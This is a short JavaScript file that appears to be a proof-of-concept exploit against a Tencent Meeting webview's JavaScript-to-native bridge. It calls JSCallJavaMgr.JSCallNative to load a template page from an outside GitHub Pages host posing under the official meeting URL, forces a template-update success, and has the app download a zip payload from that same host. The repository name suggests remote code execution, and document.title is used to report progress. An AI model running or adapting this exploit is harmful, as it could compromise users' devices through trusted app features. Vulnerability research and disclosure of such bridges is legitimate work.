(function(){
  document.title='P125TB:'+location.host;
  window.__p=function(r){
    try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
    document.title='P125CB:'+(r&&r.callId)+':'+location.host+':'+(r&&r.code)+':'+String(r&&r.message||JSON.stringify(r&&r.data||{})).slice(0,80);
  };
  function c(id,mod,m,p){
    try{
      window.JSCallJavaMgr.JSCallNative(JSON.stringify({
        callback:'window.__p',module:mod,method:m,param:p,callId:id
      }));
    }catch(e){
      document.title='P125TB-NOJS:'+location.host;
    }
  }
  if(!window.JSCallJavaMgr){document.title='P125TB-NOMGR:'+location.host;return}
  var official='https://meeting.tencent.com/v2/webview/keep-app-alive';
  var tpl='https://gitwhs.github.io/wm-poc-rce/p125tpl.html';
  var zip='https://gitwhs.github.io/wm-poc-rce/p97avatar.zip';
  var q=[
    ['H2','CommonPlugin','GetPerformance',{}],
    ['LT','CommonPlugin','LoadTemplateWebView',{
      url:official,
      template_url:tpl,
      template_id:'p125',
      process_pattern:0,
      from_webView:true
    }],
    ['TU','CommonPlugin','TemplateUpdateSuccess',{
      template_id:'p125',
      url:official,
      template_url:tpl
    }],
    ['EF','CommonPlugin','ExportFile',{
      fileName:'p125.bin',
      contentType:'application/octet-stream',
      url:zip
    }]
  ];
  var i=0;
  function n(){
    if(i>=q.length){document.title='P125TB-DONE:'+location.host;return}
    var x=q[i++];
    document.title='P125-RUN:'+x[0];
    c(x[0],x[1],x[2],x[3]);
    setTimeout(n, 4000);
  }
  setTimeout(n, 800);
})();
